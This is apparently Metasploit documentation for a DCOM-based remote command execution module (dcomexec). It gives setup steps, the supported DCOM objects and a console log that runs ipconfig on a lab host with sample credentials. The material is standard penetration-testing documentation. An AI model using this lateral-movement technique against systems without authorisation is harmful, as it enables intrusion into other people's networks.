## Description

A similar approach to psexec but executing commands through DCOM.
You can select different objects to be used to execute the commands.
Currently supported objects are:

1. MMC20.Application (`49B2791A-B1AE-4C90-9B8E-E860BA07F889`)
  - Tested Windows 7, Windows 10, Server 2012R2
1. ShellWindows (`9BA05972-F6A8-11CF-A442-00A0C90A8F39`)
  - Tested Windows 7, Windows 10, Server 2012R2
1. ShellBrowserWindow (`C08AFD90-F2A1-11D1-8455-00A0C91F3880`)
  - Tested Windows 10, Server 2012R2

## Verification Steps

1. Install [Impacket][1] v0.9.17 from GitHub. The `impacket` package must be in
   Python's module path, so `import impacket` works from any directory.
1. Install [pycrypto][2] v2.7 (the experimental release). Impacket requires this
   specific version.
1. Start msfconsole
1. Do: `use auxiliary/scanner/smb/impacket/dcomexec`
1. Set: `COMMAND`, `RHOSTS`, `SMBUser`, `SMBPass`
1. Do: `run`, see the command result (if `OUTPUT` is enabled)

## Options

  **OUTPUT**
  
  When the `OUTPUT` option is enabled, the result of the command will be written
  to a temporary file on the remote host and then retrieved. This allows the
  module user to view the output but also causes it to be written to disk before
  it is retrieved and deleted.

## Scenarios

```
metasploit-framework (S:0 J:1) auxiliary(scanner/smb/impacket/dcomexec) > show options 

Module options (auxiliary/scanner/smb/impacket/dcomexec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND    ipconfig         yes       The command to execute
   OBJECT     MMC20            yes       The DCOM object to use for execution (Accepted: ShellWindows, ShellBrowserWindow, MMC20)
   OUTPUT     true             yes       Get the output of the executed command
   RHOSTS     192.168.90.11    yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    wakawaka         yes       The password for the specified username
   SMBUser    spencer          yes       The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

metasploit-framework (S:0 J:1) auxiliary(scanner/smb/impacket/dcomexec) > run

[*] [2018.04.04-17:07:51] Running for 192.168.90.11...
[*] [2018.04.04-17:07:51] 192.168.90.11 - SMBv3.0 dialect used
[*] [2018.04.04-17:07:51] 192.168.90.11 - Target system is 192.168.90.11 and isFDQN is False
[*] [2018.04.04-17:07:51] 192.168.90.11 - StringBinding: Windows8VM[55339]
[*] [2018.04.04-17:07:51] 192.168.90.11 - StringBinding: 10.0.3.15[55339]
[*] [2018.04.04-17:07:51] 192.168.90.11 - StringBinding: 192.168.90.11[55339]
[*] [2018.04.04-17:07:51] 192.168.90.11 - StringBinding chosen: ncacn_ip_tcp:192.168.90.11[55339]
[*] [2018.04.04-17:07:52] 
Windows IP Configuration


Ethernet adapter Ethernet 5:

   Connection-specific DNS Suffix  . : foo.lan
   Link-local IPv6 Address . . . . . : fe80::9ceb:820e:7c6b:def9%17
   IPv4 Address. . . . . . . . . . . : 10.0.3.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.3.2

Ethernet adapter Local Area Connection:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Ethernet adapter Ethernet 3:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.90.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Tunnel adapter isatap.foo.lan:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : foo.lan

Tunnel adapter isatap.{70FE2ED7-E141-40A9-9CAF-E8556F6A4E80}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

[*] [2018.04.04-17:07:52] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

[1]: https://github.com/CoreSecurity/impacket
[2]: https://www.dlitz.net/software/pycrypto/
